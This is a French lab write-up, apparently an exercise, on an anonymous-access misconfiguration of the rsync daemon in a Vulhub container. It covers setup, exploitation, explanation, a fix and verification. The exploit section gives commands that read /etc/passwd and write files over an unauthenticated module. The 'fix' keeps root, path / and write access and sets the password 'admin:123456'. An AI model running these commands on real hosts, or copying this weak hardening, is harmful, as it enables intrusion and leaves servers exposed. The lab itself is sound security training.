# Rsync Unauthorized Access
## Présentation du logiciel

Rsync (Remote Sync) est un utilitaire standard de synchronisation de fichiers sur les systèmes Linux et Unix. Il se distingue par l'utilisation d'un algorithme de transfert différentiel qui ne copie que les octets modifiés d'un fichier, optimisant ainsi l'usage de la bande passante. Il fonctionne soit via SSH, soit via son propre démon écoutant sur le port TCP 873.

Contextes d'utilisation et risques associés : Ce logiciel est intégré dans plusieurs processus d'infrastructure, ce qui définit la surface d'attaque en cas de faille :

- Sauvegardes et Archivage : Rsync est utilisé pour les plans de reprise d'activité (Disaster Recovery). Une compromission expose l'organisation au vol de données massives ou à l'altération des archives (ex: suppression avant une attaque ransomware).

- Déploiement applicatif (CI/CD) : Il est souvent employé pour transférer le code vers les environnements de production. Un accès non autorisé permettrait d'injecter des scripts malveillants directement sur les serveurs web publics.

- Architecture Cluster : Il assure la réplication de données entre différents nœuds serveurs. L'accès à ce service peut faciliter un mouvement latéral vers d'autres machines du réseau interne.

## Chargement de l'image Vulhub
Cette étape prépare l'environnement sur la machine victime.
```
git clone https://github.com/vulhub/vulhub
cd rsync/common

sudo docker-compose up -d

sudo docker ps
```
## Présentation de la vulnérabilité

La faille exploitée est un défaut de configuration critique du démon Rsync (port 873). Par défaut, sans restriction explicite dans rsyncd.conf, le service peut autoriser des connexions anonymes avec des droits élevés.

Mécanisme et Impact : Dans notre cas, le démon est configuré avec un module accessible en écriture (read only = no) et sans mot de passe. Puisque le service tourne souvent avec les privilèges root, cette erreur transforme un simple outil de transfert en porte dérobée majeure. L'attaquant ne se limite pas à lire des fichiers : il peut exécuter des commandes système (RCE) en déposant des tâches planifiées (Cron) malveillantes ou des clés SSH, prenant ainsi le contrôle total de l'infrastructure hébergeant le service.

## Exploit de la vulnérabilité

Sur la machine attaquante : 
```
# Preuve d'accès
rsync rsync://<IP-VICTIME>:873/src/

# Preuve de lecture
rsync -av rsync://<IP-VICTIME:873/src/etc/passwd ./

# Preuve d'écriture
touch pwned.txt
rsync pwned.txt rsync://<IP_VICTIME>:873/src/home/
```

## Explication de la raison pour laquelle l’exploit fonctionne

L'exploit fonctionne parce que le fichier de configuration rsyncd.conf ne restreint pas l'accès.
En inspectant la configuration par défaut du conteneur, on constate que :
- Il n'y a pas de directive auth users définie pour le module [src].
- Il n'y a pas de directive secrets file pour vérifier les mots de passe.
- La directive read only = no est présente, autorisant l'écriture.
- Le service a les drois d'écritures partout sur le système
Par défaut, si aucune authentification n'est spécifiée, Rsync autorise les connexions anonymes. Comme le module path est défini sur / (la racine), tout le système de fichiers est exposé.

## Proposition justifiée d’un correctif

Le Correctif Proposé : La solution est d'activer l'authentification obligatoire pour ce module Rsync. Nous allons modifier le fichier de configuration rsyncd.conf pour ajouter les directives auth users et secrets file.

- auth users : Restreint l'accès à une liste d'utilisateurs spécifiques.
- secrets file : Pointe vers un fichier contenant les paires utilisateur/mot de passe.
- permissions : Change les permissions du fichier secret -chmod 600) sans quoi rsync refusera de démarrer par sécurité.

Justification : Ce correctif respecte la contrainte de ne pas mettre à jour le logiciel. Il s'attaque à la cause racine (l'accès anonyme) en imposant une barrière d'authentification. Même si la version de Rsync reste la même, l'exploit ne fonctionnera plus car le serveur rejettera toute connexion qui ne fournit pas d'identifiants valides.

## Application du correctif

machine victime :

Accès au conteneur
```
sudo docker ps
sudo docker exec -it <CONTAINER_ID> /bin/bash
```

Ecraser la configuration vulnérable
```
cat > /etc/rsyncd.conf <<EOF
uid = root
gid = root
use chroot = no
max connections = 4
syslog facility = local5
pid file = /var/run/rsyncd.pid
log file = /var/log/rsyncd.log

[src]
path = /
comment = src path
read only = no
auth users = admin
secrets file = /etc/rsyncd.secrets
EOF
```

Création du mot de passe admin
```
echo "admin:123456" > /etc/rsyncd.secrets
chmod 600 /etc/rsyncd.secrets
exit
```

Redémarrage du service
```
sudo docker restart <CONTAINER_ID>
```

## Démonstration que l’exploit ne fonctionne plus

Sur la machine attaquante :

L'attaque anonyme échoue
```
rsync rsync://192.168.125.128:873/src/      
Password: 
@ERROR: auth failed on module src
rsync error: error starting client-server protocol (code 5) at main.c(1850) [Receiver=3.4.1]
```

L'accès légitime fonctionne 
```
rsync rsync://admin@<IP_VICTIME>:873/src/                  
Password: 
drwxr-xr-x          4,096 2025/12/01 00:03:27 .
-rwxr-xr-x              0 2025/12/01 00:03:27 .dockerenv
-rwxrwxr-x            101 2025/12/01 00:00:42 docker-entrypoint.sh
```
